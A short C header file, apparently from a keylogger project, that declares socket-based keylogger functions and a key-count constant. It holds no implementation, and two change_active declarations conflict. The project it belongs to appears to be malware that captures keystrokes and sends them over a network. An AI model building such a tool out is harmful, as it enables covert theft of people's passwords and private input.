//
// Created by olive on 10/27/2024.
//

#ifndef KEYLOGGER_H
#define KEYLOGGER_H
#define FULL_KEYBOARD_KEY_NUMBER 104

void keylogger_main(SOCKET socket);
void keylogger(SOCKET sock);
void change_active();
void change_active(int change);

#endif //KEYLOGGER_H
